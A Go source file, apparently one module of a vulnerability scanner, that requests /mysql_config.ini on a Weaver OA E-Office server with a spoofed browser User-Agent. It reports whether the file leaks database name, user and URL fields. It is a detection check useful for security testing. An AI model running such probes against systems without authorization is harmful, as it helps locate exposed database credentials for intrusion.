package eclogy_mysql_config

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/mysql_config.ini"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-01] 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞不存在")
		return
	}

	if resp.StatusCode == 200 {
		body := resp.String()
		if strings.Contains(body, "dataname") || strings.Contains(body, "datauser") || strings.Contains(body, "dataurl") {
			cheurl := url + "/mysql_config.ini"
			color.Green.Println("[+01] 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞存在 -> ", cheurl)
		} else {
			color.Red.Println("[-01] 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞不存在")
		}
	} else {
		color.Red.Println("[-01] 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞不存在")
	}
}
